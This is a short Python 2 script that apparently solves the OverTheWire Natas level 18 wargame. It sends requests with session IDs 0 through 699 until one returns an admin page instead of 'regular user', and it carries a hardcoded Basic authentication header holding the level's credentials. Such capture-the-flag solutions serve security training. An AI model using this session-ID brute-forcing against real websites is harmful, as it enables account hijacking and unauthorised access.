import requests

url="http://natas18.natas.labs.overthewire.org/index.php"
creds={"useraname":"admin","password":"admin"}

for i in range(700):
	h={"Cookie":"PHPSESSID={0}".format(i),"Authorization":"Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
	r=requests.post(url,headers=h,params=creds)
	if "regular user" in r.text:
		continue
	else:
		print "PHPSESSID<><><><><><>", i
		print r.text
		exit()